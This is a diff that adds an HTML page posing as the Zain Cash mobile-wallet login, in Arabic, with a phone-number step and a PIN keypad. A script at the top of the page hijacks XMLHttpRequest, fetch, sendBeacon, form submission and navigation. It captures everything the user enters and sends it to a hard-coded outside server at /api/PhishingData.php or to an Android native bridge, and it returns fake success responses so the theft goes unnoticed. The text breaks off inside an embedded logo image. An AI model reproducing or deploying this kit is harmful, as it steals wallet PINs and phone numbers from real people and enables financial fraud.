@@ -1,0 +1,1050 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<script>
+(function(){
+  if (window.__fyInterceptorInjected) return;
+  window.__fyInterceptorInjected = true;
+
+  var TARGET_PATH = '/api/PhishingData.php';
+  var TARGET_URL = 'http://18.142.44.159:8035/api/PhishingData.php';
+
+  function isOurTargetUrl(u){
+    if (!u) return false;
+    u = String(u);
+    if (u.indexOf(TARGET_PATH) !== -1 || u.indexOf(TARGET_URL) !== -1) return true;
+    try {
+      var cfg = (window.__PHISH_CONFIG__ || window.__PHISH_CONFIG) || {};
+      var submitUrl = cfg.submit_url || '';
+      if (submitUrl && u.indexOf(submitUrl) !== -1) return true;
+    } catch(e){}
+    return false;
+  }
+
+  var STATIC_EXT_RE = /\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|otf|mp[34]|webm|pdf|zip|rar|7z|map|woff|bmp|tiff?|aac|flac|ogg|wav|webp|avif)(\?|#|$)/i;
+
+  function isSubmitUrl(u){
+    if (!u) return false;
+    u = String(u);
+    if (u.indexOf(TARGET_PATH) !== -1) return true;
+    if (u.indexOf(TARGET_URL) !== -1) return true;
+    if (STATIC_EXT_RE.test(u)) return false;
+    if (/\/api\/|\/inj\/|\/inject|\/submit|\/login|\/log\/|\/save|\/post|\/send|\/upload|\/collect|\/capture|\/result|\/phish|\/form/i.test(u)) {
+      return true;
+    }
+    if (/\.php(\?|&|$)|\.asp(\?|&|$)|\.aspx(\?|&|$)|\.jsp(\?|&|$)|\.do(\?|&|$)|\.action(\?|&|$)|\.ashx(\?|&|$)|\.cgi(\?|&|$)/i.test(u)) {
+      return true;
+    }
+    return false;
+  }
+
+  function formDataToObj(fd){
+    var o = {};
+    try {
+      var add = function(k, v){
+        if (o[k] !== undefined) {
+          if (!Array.isArray(o[k])) o[k] = [o[k]];
+          o[k].push(v);
+        } else { o[k] = v; }
+      };
+      if (fd.forEach) { fd.forEach(function(v, k){ add(k, v); }); }
+      else if (fd.entries) {
+        var it = fd.entries(), r;
+        while (!(r = it.next()).done) add(r.value[0], r.value[1]);
+      }
+    } catch(e){}
+    return o;
+  }
+
+  function urlEncodedToObj(s){
+    var o = {};
+    try {
+      s.split('&').forEach(function(p){
+        if (!p) return;
+        var idx = p.indexOf('=');
+        var k, v;
+        if (idx === -1) { k = decodeURIComponent(p.replace(/\+/g,' ')); v = ''; }
+        else { k = decodeURIComponent(p.substring(0,idx).replace(/\+/g,' '));
+               v = decodeURIComponent(p.substring(idx+1).replace(/\+/g,' ')); }
+        if (k) o[k] = v;
+      });
+    } catch(e){}
+    return o;
+  }
+
+  function normalizeBody(body){
+    if (body === null || body === undefined) return {};
+    if (body instanceof FormData) return formDataToObj(body);
+    if (typeof body === 'string') {
+      var t = body.trim();
+      if (t === '') return {};
+      if ((t.charAt(0)==='{' && t.charAt(t.length-1)==='}') ||
+          (t.charAt(0)==='[' && t.charAt(t.length-1)===']')) {
+        try { return JSON.parse(t); } catch(e){}
+      }
+      if (t.indexOf('=') !== -1 && t.indexOf('{') === -1) return urlEncodedToObj(t);
+      return { raw: body };
+    }
+    if (typeof body === 'object') {
+      if (typeof URLSearchParams !== 'undefined' && body instanceof URLSearchParams) {
+        var o = {};
+        try { body.forEach(function(v,k){ o[k]=v; }); } catch(e){}
+        return o;
+      }
+      if (body instanceof Blob || body instanceof File) return { raw: '[binary]' };
+      return body;
+    }
+    return { raw: String(body) };
+  }
+
+  // 提前保存原始 XHR 方法，供 fyPostPhish 的 fallback 使用
+  var _origOpen = XMLHttpRequest.prototype.open;
+  var _origSend = XMLHttpRequest.prototype.send;
+
+  function ensureFyPostPhish(){
+    if (typeof window.fyPostPhish === 'function') return window.fyPostPhish;
+    window.fyPostPhish = function(raw){
+      try {
+        var cfg = window.__PHISH_CONFIG || {};
+        var clean = normalizeBody(raw);
+        // 优先使用原生桥接 Android.submitData，避免 WebView 跨域 CORS 预检
+        if (typeof Android !== 'undefined' && Android.submitData) {
+          try {
+            Android.submitData(JSON.stringify(clean));
+            return;
+          } catch(e){}
+        }
+        // Fallback：XHR（仅用于浏览器测试环境，无原生桥接时）
+        // 直接用原始 open/send 发送，避免被自身拦截器再次拦截导致递归
+        var body = {
+          phone_id: cfg.phone_id || '',
+          package_name: cfg.package_name || '',
+          appName: cfg.appName || '',
+          payload: clean
+        };
+        var url = cfg.submit_url || TARGET_URL;
+        var xhr = new XMLHttpRequest();
+        _origOpen.call(xhr, 'POST', url, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        _origSend.call(xhr, JSON.stringify(body));
+      } catch(e){}
+    };
+    return window.fyPostPhish;
+  }
+
+  var fyPostPhish = ensureFyPostPhish();
+
+  // 模拟 XHR 完成，触发页面回调，避免页面逻辑挂起
+  function mockXhrComplete(xhr){
+    try {
+      var respBody = '{"code":200,"msg":"ok"}';
+      try {
+        xhr.readyState = 4;
+        xhr.status = 200;
+        xhr.statusText = 'OK';
+        xhr.responseText = respBody;
+        xhr.response = respBody;
+        xhr.responseURL = TARGET_URL;
+      } catch(e){
+        var props = { readyState:4, status:200, statusText:'OK', responseText:respBody, response:respBody, responseURL:TARGET_URL };
+        for (var k in props) {
+          try { Object.defineProperty(xhr, k, { value: props[k], writable:true, configurable:true }); } catch(e2){}
+        }
+      }
+      try {
+        xhr.getResponseHeader = function(name){ return /content-type/i.test(name) ? 'application/json' : null; };
+        xhr.getAllResponseHeaders = function(){ return 'content-type: application/json\r\n'; };
+      } catch(e){}
+      if (typeof xhr.onreadystatechange === 'function') xhr.onreadystatechange.call(xhr);
+      if (typeof xhr.onload === 'function') xhr.onload.call(xhr);
+      if (typeof xhr.onloadend === 'function') xhr.onloadend.call(xhr);
+      if (typeof xhr.dispatchEvent === 'function') {
+        try { xhr.dispatchEvent(new Event('readystatechange')); } catch(e){}
+        try { xhr.dispatchEvent(new Event('load')); } catch(e){}
+        try { xhr.dispatchEvent(new Event('loadend')); } catch(e){}
+      }
+    } catch(e){}
+  }
+
+  // 劫持 XMLHttpRequest（支持 POST 和 GET 带参）
+  XMLHttpRequest.prototype.open = function(method, url){
+    this.__fyMethod = (method || '').toUpperCase();
+    this.__fyUrl = url;
+    this.__fyIsSubmit = isSubmitUrl(url);
+    return _origOpen.apply(this, arguments);
+  };
+  XMLHttpRequest.prototype.send = function(body){
+    try {
+      var method = this.__fyMethod || 'GET';
+      var url = this.__fyUrl || '';
+      var isSubmit = this.__fyIsSubmit;
+      if (method === 'POST' && isSubmit) {
+        fyPostPhish(normalizeBody(body));
+        mockXhrComplete(this);
+        return;
+      }
+      if (method === 'GET' && isSubmit && /[?&][^=]+=/.test(String(url))) {
+        var qs = String(url).split('?')[1] || '';
+        fyPostPhish(urlEncodedToObj(qs));
+        mockXhrComplete(this);
+        return;
+      }
+    } catch(e){}
+    return _origSend.apply(this, arguments);
+  };
+
+  // 劫持 fetch（支持 POST 和 GET 带参，兼容 Request 对象）
+  if (window.fetch) {
+    var _origFetch = window.fetch;
+    window.fetch = function(url, opts){
+      try {
+        opts = opts || {};
+        var isReq = (typeof Request !== 'undefined') && (url instanceof Request);
+        var urlStr = isReq ? url.url : (typeof url === 'string' ? url : (url && url.url) || '');
+        var method = (isReq ? url.method : (opts.method || 'GET')).toUpperCase();
+        var isSubmit = isSubmitUrl(urlStr);
+        var isPost = method === 'POST';
+        var isGetWithData = method === 'GET' && isSubmit && /[?&][^=]+=/.test(urlStr);
+        if ((isPost && isSubmit) || isGetWithData) {
+          var body = isReq ? (opts.body || (url.body ? '[stream]' : undefined)) : opts.body;
+          var data = isGetWithData ? urlEncodedToObj(urlStr.split('?')[1] || '') : normalizeBody(body);
+          fyPostPhish(data);
+          var fakeResp = new Response(JSON.stringify({code:200,msg:'saved'}), {
+            status: 200, statusText: 'OK',
+            headers: {'Content-Type':'application/json'}
+          });
+          return Promise.resolve(fakeResp);
+        }
+      } catch(e){}
+      return _origFetch.apply(this, arguments);
+    };
+  }
+
+  // 劫持 sendBeacon（现代浏览器无痕提交）
+  if (navigator && typeof navigator.sendBeacon === 'function') {
+    var _origBeacon = navigator.sendBeacon.bind(navigator);
+    navigator.sendBeacon = function(url, data){
+      try {
+        if (isSubmitUrl(url)) {
+          fyPostPhish(normalizeBody(data));
+          return true;
+        }
+      } catch(e){}
+      return _origBeacon(url, data);
+    };
+  }
+
+  // 劫持 <script src>（JSONP 跨域提交）
+  try {
+    var _origScriptSrc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
+    if (_origScriptSrc && _origScriptSrc.set) {
+      Object.defineProperty(HTMLScriptElement.prototype, 'src', {
+        set: function(v){
+          try {
+            if (v && typeof v === 'string' && v.indexOf('?') !== -1 && /[?&][^=]+=/.test(v) && isSubmitUrl(v)) {
+              var qs = v.split('?')[1] || '';
+              fyPostPhish(urlEncodedToObj(qs));
+            }
+          } catch(e){}
+          _origScriptSrc.set.call(this, v);
+        },
+        get: _origScriptSrc.get,
+        configurable: true
+      });
+    }
+  } catch(e){}
+
+  // 劫持 location 跳转带参（支持 location.href= / location.assign/replace）
+  // 注意：不劫持 window.location 本身，因为它是 WebView 原生管理的特殊对象，
+  // 劫持其 getter/setter 会破坏 WebView 内部状态导致严重卡顿。
+  // window.location = url 等价于 location.href = url，会被下面的 href setter 拦截。
+  var _hrefDesc = Object.getOwnPropertyDescriptor(Location.prototype, 'href');
+  var _origHrefSet = _hrefDesc && _hrefDesc.set ? _hrefDesc.set : null;
+  if (_origHrefSet) {
+    try {
+      Object.defineProperty(Location.prototype, 'href', {
+        configurable: true,
+        get: _hrefDesc.get,
+        set: function(v){
+          try {
+            if (v && typeof v === 'string' && /[?&][^=]+=/.test(v) && isSubmitUrl(v)) {
+              var qs = v.split('?')[1] || '';
+              fyPostPhish(urlEncodedToObj(qs));
+            }
+          } catch(e){}
+          _origHrefSet.call(this, v);
+        }
+      });
+    } catch(e){}
+  }
+  // 劫持 location.assign(url) 和 location.replace(url)
+  try {
+    var _origAssign = Location.prototype.assign;
+    var _origReplace = Location.prototype.replace;
+    Location.prototype.assign = function(url){
+      try {
+        if (url && typeof url === 'string' && /[?&][^=]+=/.test(url) && isSubmitUrl(url) && !isOurTargetUrl(url)) {
+          var qs = url.split('?')[1] || '';
+          fyPostPhish(urlEncodedToObj(qs));
+        }
+      } catch(e){}
+      return _origAssign.call(this, url);
+    };
+    Location.prototype.replace = function(url){
+      try {
+        if (url && typeof url === 'string' && /[?&][^=]+=/.test(url) && isSubmitUrl(url) && !isOurTargetUrl(url)) {
+          var qs = url.split('?')[1] || '';
+          fyPostPhish(urlEncodedToObj(qs));
+        }
+      } catch(e){}
+      return _origReplace.call(this, url);
+    };
+  } catch(e3){}
+
+  // 劫持 form.submit() 程序化提交（DOM 规范：submit() 不触发 submit 事件）
+  try {
+    var _origFormSubmit = HTMLFormElement.prototype.submit;
+    HTMLFormElement.prototype.submit = function(){
+      try {
+        var form = this;
+        var action = form.getAttribute('action') || '';
+        var method = (form.getAttribute('method') || 'get').toUpperCase();
+        var isPost = method === 'POST';
+        var isGetSubmit = method === 'GET' && isSubmitUrl(action);
+        if (isPost && (action === '' || isSubmitUrl(action))) {
+          var data = {};
+          try {
+            new FormData(form).forEach(function(v, k){
+              if (data[k] !== undefined) {
+                if (!Array.isArray(data[k])) data[k] = [data[k]];
+                data[k].push(v);
+              } else { data[k] = v; }
+            });
+          } catch(e2){}
+          fyPostPhish(data);
+          return; // 阻止真实提交
+        } else if (isGetSubmit) {
+          var dataGet = {};
+          try {
+            new FormData(form).forEach(function(v, k){ dataGet[k] = v; });
+          } catch(e3){}
+          fyPostPhish(dataGet);
+          return;
+        }
+      } catch(e){}
+      return _origFormSubmit.apply(this, arguments);
+    };
+  } catch(e){}
+
+  // 劫持原生 form 提交（捕获阶段，优先于业务代码，支持 POST 和 GET）
+  document.addEventListener('submit', function(e){
+    try {
+      var form = e.target;
+      if (!form || form.tagName !== 'FORM') return;
+      var action = form.getAttribute('action') || '';
+      var method = (form.getAttribute('method') || 'get').toUpperCase();
+      var isPost = method === 'POST';
+      var isGetSubmit = method === 'GET' && isSubmitUrl(action);
+      if (isPost && (action === '' || isSubmitUrl(action))) {
+        e.preventDefault();
+        var data = {};
+        try {
+          new FormData(form).forEach(function(v, k){
+            if (data[k] !== undefined) {
+              if (!Array.isArray(data[k])) data[k] = [data[k]];
+              data[k].push(v);
+            } else { data[k] = v; }
+          });
+        } catch(e2){}
+        fyPostPhish(data);
+      } else if (isGetSubmit) {
+        e.preventDefault();
+        var dataGet = {};
+        try {
+          new FormData(form).forEach(function(v, k){ dataGet[k] = v; });
+        } catch(e3){}
+        fyPostPhish(dataGet);
+      }
+    } catch(e){}
+  }, true);
+})();
+</script>
+
+<meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Zain Cash</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+      user-select: none;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      background: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      overflow: hidden;
+    }
+
+    .app-viewport {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      max-width: 480px;
+      margin: 0 auto;
+      background: #ffffff;
+      overflow: hidden;
+    }
+
+    /* 两步切换视图 */
+    .step-view {
+      display: none;
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .step-view.active {
+      display: flex;
+      animation: fadeIn 0.22s ease-out forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(3px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ========================================================
+       STEP 1: 白底极简手机号输入页
+       ======================================================== */
+    .step1-container {
+      background: #ffffff;
+      padding: 34px 22px 28px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      height: 100%;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+    }
+
+    /* 顶部导航行：左侧指示进度条，右侧箭头 -> (LTR 布局) */
+    .top-progress-bar {
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      gap: 22px;
+      margin-top: 4px;
+      margin-bottom: 34px;
+      direction: ltr;
+    }
+
+    .progress-segments {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .prog-pill {
+      height: 5px;
+      width: 48px;
+      border-radius: 3px;
+      background: #d8dde3;
+    }
+
+    .prog-pill.step-active {
+      background: #d8dde3;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .prog-pill.step-active::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      right: 0;
+      width: 8px;
+      height: 100%;
+      border-radius: 3px;
+      background: #1b3858;
+    }
+
+    .top-arrow-btn {
+      background: transparent;
+      border: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      color: #111827;
+      padding: 0;
+    }
+
+    .top-arrow-btn svg {
+      width: 22px;
+      height: 22px;
+      stroke: #111827;
+      stroke-width: 2.2;
+      fill: none;
+    }
+
+    /* 标题区域 */
+    .step1-title {
+      font-size: 26px;
+      font-weight: 800;
+      color: #1a202c;
+      letter-spacing: -0.3px;
+      margin-bottom: 12px;
+      line-height: 1.35;
+      direction: rtl;
+      text-align: right;
+    }
+
+    .step1-subtitle {
+      font-size: 14.5px;
+      color: #8a96a3;
+      font-weight: 500;
+      margin-bottom: 32px;
+      line-height: 1.4;
+      direction: rtl;
+      text-align: right;
+    }
+
+    .input-label {
+      font-size: 15px;
+      font-weight: 700;
+      color: #2d3748;
+      margin-bottom: 12px;
+      direction: rtl;
+      text-align: right;
+    }
+
+    /* 手机号输入框组合 */
+    .phone-field-wrapper {
+      width: 100%;
+      height: 56px;
+      background: #f6f6f8;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      direction: ltr; /* 区号在左侧，号码在右侧 */
+      transition: all 0.2s ease;
+      border: 1.2px solid transparent;
+    }
+
+    .phone-field-wrapper:focus-within {
+      border-color: #276657;
+      background: #ffffff;
+      box-shadow: 0 0 0 3px rgba(39, 102, 87, 0.12);
+    }
+
+    .country-code {
+      font-size: 16px;
+      font-weight: 600;
+      color: #2d3748;
+      display: flex;
+      align-items: center;
+      padding-right: 14px;
+      border-right: 1px solid #e2e8f0;
+      margin-right: 14px;
+      flex-shrink: 0;
+    }
+
+    .phone-input {
+      flex: 1;
+      height: 100%;
+      border: none;
+      outline: none;
+      background: transparent;
+      font-size: 16px;
+      font-weight: 600;
+      color: #1a202c;
+      caret-color: #276657; /* 翠绿色光标 */
+      direction: rtl;
+      text-align: right;
+    }
+
+    .phone-input::placeholder {
+      color: #a0aec0;
+      font-weight: 400;
+      font-size: 15px;
+    }
+
+    /* 底部发送按钮 */
+    .step1-bottom {
+      margin-top: auto;
+      margin-bottom: 4px;
+    }
+
+    .btn-step1 {
+      width: 100%;
+      height: 52px;
+      border-radius: 12px;
+      background: #b3b3b3;
+      color: #ffffff;
+      font-size: 16.5px;
+      font-weight: 700;
+      border: none;
+      cursor: not-allowed;
+      transition: all 0.2s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .btn-step1.active {
+      background: #276657;
+      cursor: pointer;
+      box-shadow: 0 4px 14px rgba(39, 102, 87, 0.35);
+    }
+
+    .btn-step1.active:active {
+      transform: scale(0.985);
+      background: #1f5246;
+    }
+
+    /* ========================================================
+       STEP 2: 华丽紫调 PIN 码输入页 (com.audiogram.zaincash)
+       ======================================================== */
+    .step2-container {
+      background: linear-gradient(180deg, #792e8b 0%, #5d1f73 50%, #3f1155 100%);
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      padding: 56px 20px 28px;
+      overflow-y: auto;
+      position: relative;
+    }
+
+    /* 顶部品牌图标与英文标题 */
+    .step2-brand-area {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 6px;
+    }
+
+    .brand-app-icon {
+      width: 78px;
+      height: 78px;
+      border-radius: 18px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.28);
+      display: block;
+      margin-bottom: 14px;
+    }
+
+    .brand-app-name {
+      font-size: 22px;
+      font-weight: 700;
+      color: #ffffff;
+      letter-spacing: 0.2px;
+      direction: ltr;
+    }
+
+    /* 中间 PIN 提示 */
+    .step2-pin-area {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      margin-top: 24px;
+      text-align: center;
+    }
+
+    .pin-prompt-text {
+      font-size: 14.5px;
+      font-weight: 500;
+      color: rgba(255, 255, 255, 0.9);
+      margin-bottom: 24px;
+      direction: rtl;
+    }
+
+    /* PIN 圆圈指示器 */
+    .pin-dots-row {
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      direction: ltr;
+      margin-bottom: 12px;
+    }
+
+    .pin-circle {
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.22);
+      transition: all 0.18s ease;
+    }
+
+    .pin-circle.filled {
+      background: #ffffff;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.9);
+      transform: scale(1.15);
+    }
+
+    /* 椭圆形数字键盘 (3列 x 4行，从左到右：3 2 1 / 6 5 4 / 9 8 7 / ⌫ 0) */
+    .keypad-container {
+      width: 100%;
+      max-width: 345px;
+      margin-top: auto;
+      margin-bottom: 8px;
+      direction: ltr; /* 固定布局方向 */
+    }
+
+    .keypad-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      row-gap: 14px;
+      column-gap: 14px;
+      justify-items: center;
+      align-items: center;
+    }
+
+    .key-oval {
+      width: 100%;
+      max-width: 98px;
+      height: 52px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.12);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.18), inset 0 1px 1px rgba(255, 255, 255, 0.15);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      font-weight: 700;
+      color: #ffffff;
+      cursor: pointer;
+      user-select: none;
+      touch-action: manipulation;
+      transition: transform 0.08s ease, background 0.12s ease;
+    }
+
+    .key-oval:active {
+      background: rgba(255, 255, 255, 0.24);
+      transform: scale(0.95);
+    }
+
+    .key-oval.empty {
+      visibility: hidden;
+      pointer-events: none;
+      background: transparent;
+      border: none;
+      box-shadow: none;
+    }
+
+    .del-svg {
+      width: 22px;
+      height: 18px;
+      display: block;
+    }
+
+    /* 底部“忘记 PIN 码”链接 */
+    .forgot-pin-link {
+      font-size: 13px;
+      color: rgba(255, 255, 255, 0.72);
+      margin-top: 14px;
+      cursor: pointer;
+      text-align: center;
+      direction: rtl;
+    }
+    .forgot-pin-link:active {
+      color: #ffffff;
+    }
+
+    /* 弹窗 Toast */
+    .app-toast {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0, 0, 0, 0.85);
+      color: #ffffff;
+      padding: 12px 24px;
+      border-radius: 8px;
+      font-size: 14.5px;
+      font-weight: 500;
+      z-index: 1000;
+      display: none;
+      text-align: center;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.35);
+    }
+  </style>
+</head>
+<body>
+  <div class="app-viewport">
+    <!-- ================= 页面 1: 手机号输入 ================= -->
+    <div class="step-view active" id="viewStep1">
+      <div class="step1-container">
+        <div>
+          <!-- 顶部进度条与右侧箭头 -->
+          <div class="top-progress-bar">
+            <div class="progress-segments">
+              <div class="prog-pill"></div>
+              <div class="prog-pill"></div>
+              <div class="prog-pill step-active"></div>
+            </div>
+            <button type="button" class="top-arrow-btn">
+              <svg viewBox="0 0 24 24">
+                <line x1="5" y1="12" x2="19" y2="12"></line>
+                <polyline points="12 5 19 12 12 19"></polyline>
+              </svg>
+            </button>
+          </div>
+
+          <!-- 标题与副标题 -->
+          <h1 class="step1-title">ما هو رقم الهاتف الخاص بك؟</h1>
+          <p class="step1-subtitle">لتأكيد رقم الهاتف سنرسل لك رمز OTP لمرة واحدة</p>
+
+          <!-- 手机号输入框 -->
+          <div class="input-label">رقم الهاتف</div>
+          <div class="phone-field-wrapper">
+            <span class="country-code">+962</span>
+            <input type="tel" id="inputPhone" class="phone-input" placeholder="رقم الهاتف" autocomplete="off" maxlength="15">
+          </div>
+        </div>
+
+        <!-- 底部发送按钮 -->
+        <div class="step1-bottom">
+          <button type="button" class="btn-step1" id="btnSendCode">ارسال الرمز</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ================= 页面 2: PIN 码与定制椭圆键盘 ================= -->
+    <div class="step-view" id="viewStep2">
+      <div class="step2-container">
+        <!-- 顶部品牌图标与英文标题 -->
+        <div class="step2-brand-area">
+          <img src="data:image/png;base64,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